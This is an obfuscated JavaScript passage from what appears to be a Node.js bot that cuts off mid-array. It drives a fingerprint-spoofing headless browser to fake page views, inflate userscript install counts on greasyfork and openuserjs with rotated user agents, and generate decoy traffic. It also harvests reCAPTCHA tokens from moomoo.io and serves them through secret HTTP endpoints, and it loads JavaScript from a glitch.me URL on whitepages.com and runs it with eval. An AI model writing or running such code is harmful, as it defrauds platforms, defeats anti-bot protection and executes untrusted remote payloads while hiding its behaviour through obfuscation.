      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + W(0xe, 'hjXQ'),
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + W(0x16, '9*Q*') + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2b * -0x6 + 0x1f15 + -0x2017
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2538 + -0x147b * 0x1 + -0x10bd)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1d32 + -0x43 * 0x83 + 0x3fdf), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x2226 + 0x1d * -0x3c + 0x11 * -0x196), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const Y = c,
          r = await m[Y(0x15) + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x23f0 + 0xefb + -0x4f * 0xa5;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x18a7 + -0x865 + -0x2f * -0xb4; w < getRandomInt(0x2 * -0xd53 + 0x6 * 0x48e + 0x1 * -0xad, -0x22cd + -0x2455 + -0x5 * -0xe3b); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x4c2 * 0x11 + -0x1 * -0x8da2 + 0x1cf * 0x60);
        }
      }();
    }, -0x2268 + 0x36d * -0x1 + 0x67 * 0x5f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x13 * 0x157 + 0x1 * -0x18d5 + -0xa0;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x39 * 0xd + 0x70f * -0x5 + 0xbc * 0x34, 0x130c + -0x883 * -0x1 + -0x1b5d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x7083 * -0x1 + 0x8a89 + -0x85dc);
    }, -0xdc5 + -0x42e * -0x6 + -0xaeb), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x15c5 * -0x1 + -0xc7 * 0x19 + 0x2934;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x5 * -0x1af + 0x4cd + -0x180), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x9 * -0x14f + 0x1e9b + -0x2a62), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x17500c + -0x114712 + 0x7b2a6);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xa9e * 0x3 + 0x1c90 + 0xd * -0x49e);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xf7f + 0x33 * -0x1d + -0xb07 * -0x2);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1981 * 0x2 + 0x2 * -0x316 + 0x2 * 0x2c5f);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c,
    a0 = b;
  async function f() {
    const Z = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x2 * 0x935 + -0x1a4e + 0x1 * 0x2cb9) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x24df * -0x1 + -0x1454 + -0x2 * 0x845));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x5 * 0x92 + 0x548 + -0x26e, D['indexOf']('\x20'));
        return B ? E['slice'](0x39 * -0x55 + -0x1 * -0x1151 + -0x67 * -0x4, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x24f4 + 0x1 * 0x1967 + 0x1 * -0x174b),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w[Z(0xb, 'RqMG')], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x48 * 0xa4 + -0x1d89 * 0x1 + 0x1 * 0x72b9),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + a0(0x2, 'P)z4') + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + a1(0x5) + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + a0(0x12, 'c@A^') + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a0(0x13, 'WXNq') + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + a0(0xa, 'JVrj') + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xab0 + -0x1573 + -0x1 * -0x2023; k < 0x257c + 0x2442 + -0x49ba; k++)
    setTimeout(f, (0x1cb7f + 0x19c5b + -0x27d7a) * k * getRandomInt(0x1043 + 0x81f * 0x3 + -0x289f * 0x1, -0x1963 * -0x1 + -0x1cc1 * -0x1 + -0x120b * 0x3));
  setInterval(() => {
    f();
    for (let l = 0x208b + 0x2598 + -0x201 * 0x23; l < 0x4 * 0x74b + -0x4 * -0x216 + -0x2580; l++)
      setTimeout(f, (-0x16556 * 0x1 + 0x24a6 + -0x530 * -0x6b) * l * getRandomInt(-0xed6 + -0x12b * -0x1b + -0x10b2, 0xb57 * 0x3 + -0x661 + -0x1ba1 * 0x1));
  }, -0x5271dc + -0x20 * 0x1ab98 + 0xbed35c);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2ea0 * 0x1 + 0x12e0 + -0x4 * -0xdc6) * getRandomInt(-0xcf4 * -0x2 + -0xd9c * 0x2 + -0x1 * -0x151, 0x3 * -0x1cf + 0x1804 + -0x1292 * 0x1));
}, -0x1424 + 0x1 * 0xda6 + 0x6e2);

function a() {
  const bl = [
    'y2HPBgroB2rLCW',
    'zhHtCNLtqZrytq',
